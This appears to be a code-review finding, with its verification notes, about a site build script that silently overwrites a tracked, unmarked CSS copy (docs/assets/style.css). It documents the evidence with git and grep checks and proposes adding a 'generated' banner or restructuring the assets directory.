Severity low is correct — arguably generous. This costs 81 ms and 7 MB in the local Dash process only; the public site is static/Pyodide and never executes app.py, so no visitor is affected.

title: docs/assets/style.css is a build-generated copy with no marker, sitting beside a hand-maintained sibling — edits to it are silently discarded
evidence: build_static.py:106 `shutil.copy(ROOT / 'assets' / 'style.css', DOCS / 'assets' / 'style.css')` inside copy_css(), invoked on both build paths (lines 242 and 249, i.e. full build and --data-only). So docs/assets/style.css is a generated artifact, yet it is tracked in git (`git ls-files docs/assets/` => shell.css, style.css) and carries no 'generated, do not edit' banner — its first 4 lines are the same '/* AI Frontier — Design System */' header as the source. In the same directory, docs/assets/shell.css is a hand-maintained source: `grep -n 'shell.css' build_static.py` returns nothing, so the build never touches it, and docs/index.html:21-22 loads both files identically. The two are therefore indistinguishable in the editor but have opposite semantics. The clobbering is live, not theoretical: a build during this session rewrote docs/assets/style.css (mtime 2026-08-12 23:44) while the source assets/style.css still reads Apr 10. Commit 3facb57 is titled 'fix(static): shell.css to survive rebuilds', which is direct evidence this already bit once — the response was to add a second file rather than mark the generated one. (I checked whether the two style.css files ever truly diverged in history; the four commits that appeared to diverge are an artefact of assets/style.css not existing before 2026-06-23, so they are currently byte-identical: md5 a8e92660e9cc93149232c28cce814103 for both.)
user_impact: A maintainer tweaking the deployed site's styling opens docs/assets/style.css — the file docs/index.html actually loads — makes a change, and the next build or hourly bot run silently reverts it with no warning and no merge conflict, because copy_css() overwrites it unconditionally.
suggested_fix: Have copy_css() prepend a '/* GENERATED by build_static.py — edit assets/style.css instead */' banner to the copied file, and either gitignore docs/assets/style.css or move shell.css into the source assets/ tree and copy it too, so the docs/assets directory has one consistent rule.
verify_reasoning:
I tried to kill this on four separate angles and every one held.

CONFIRMED point by point: build_static.py:104-106 is `def copy_css():` … `shutil.copy(ROOT/'assets'/'style.css', DOCS/'assets'/'style.css')`, and `grep -n copy_css build_static.py` shows it called at 242 (main / full build) and 249 (rebuild_data_only, i.e. the hourly bot path reached from refresh.yml:60). `git ls-files docs/assets/` => shell.css and style.css, so the generated file is tracked. `grep -n shell build_static.py` exits 1 — the build genuinely never touches shell.css. docs/index.html:21-22 loads both with identical <link> tags. `md5 -q` on both style.css files => a8e92660e9cc93149232c28cce814103 for both, byte-identical as claimed. head -4 of each shows the same '/* AI Frontier — Design System */' banner, and `grep -in 'generated|do not edit|autogenerated'` finds no marker in either docs/assets file. The clobber is live, not theoretical: docs/assets/style.css mtime is Aug 12 23:51 while the source assets/style.css still reads Apr 10 02:27, i.e. a build rewrote the copy during this session. `git log -1 3facb57` confirms the exact title 'fix(static): shell.css to survive rebuilds; dynamic image/video providers; agent-stack pre-boot rows'.

REFUTATION ANGLES THAT FAILED: (a) is docs/assets/style.css gitignored, making the overwrite harmless? No — .gitignore has no docs/ or css entry and git ls-files tracks it. (b) does the bot skip copy_css on the data-only path? No — line 249 is inside rebuild_data_only. (c) does index.html load only one of them so the distinction is moot? No — it loads both. (d) is the source-of-truth direction obvious from content? No — the two files are byte-identical with identical headers.

Mechanism verified: an edit to docs/assets/style.css is reverted by the next `python build_static.py --data-only` on a fresh CI checkout and then committed away by refresh.yml:66 `git add -- docs` — within an hour, with no conflict and no warning. Severity low is correct: maintainer-facing only, no user-visible breakage.
